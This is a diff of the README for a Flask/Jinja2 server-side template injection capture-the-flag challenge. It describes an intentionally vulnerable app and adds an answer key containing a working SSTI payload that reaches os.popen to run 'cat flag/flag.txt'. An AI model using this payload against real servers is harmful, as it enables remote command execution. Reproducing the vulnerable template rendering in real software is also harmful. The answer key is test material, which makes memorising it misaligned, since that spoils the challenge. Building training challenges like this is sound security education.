@@ -1,42 +1,18 @@
-# Prototype vulnerable templating CTF
+# SSTI CTF Challenge Generator
 
-This prototype creates a small Flask app that uses Jinja2 to render user-supplied templates. It's intentionally vulnerable so players can exploit template injection to read a flag file baked into the container at /flag/flag.txt.
+Simple Server-Side Template Injection (SSTI) challenge generator using Flask and Jinja2. Creates a vulnerable endpoint where players need to exploit template injection to read a flag.
 
-Files added/updated:
+## Required Environment Variables
 
-- `main.py` - generates a random flag and writes it to `./flag/flag.txt`.
-- `app.py` - Flask app that renders user-supplied Jinja2 templates and provides `flag` in the template context.
-- `Dockerfile` - builds a container exposing the app on port 5000.
-- `requirements.txt` - Python dependencies.
+- `FLAG` - The flag that will be placed in the container (e.g., "CTF{y0ur_fl4g_h3r3}")
 
-Usage (local, without Docker):
+## Quick Start
 
-1. Create a venv and install dependencies:
-```powershell
-python -m venv .venv; .\.venv\Scripts\Activate.ps1; pip install -r requirements.txt
-```
-2. Generate the flag:
-```powershell
-python main.py
-```
-3. Run the app:
-```powershell
-python app.py
-```
-
-Usage (Docker):
-
-1. Generate the flag locally (creates `./flag/flag.txt`):
-```powershell
-python main.py
-```
-2. Build the image:
+Build and run:
 ```powershell
 docker build -t ctf-proto .
-```
-3. Run the container (the flag file will be baked into the container filesystem):
-```powershell
-docker run --rm -p 5000:5000 ctf-proto
+docker run -e FLAG="CTF{test_flag}" -p 5000:5000 ctf-proto
 ```
 
-Then point your browser to http://localhost:5000 and exploit the template engine to locate `/flag/flag.txt`.
+## Answer Key
+{{config.__class__.__init__.__globals__['os'].popen('cat flag/flag.txt').read()}}
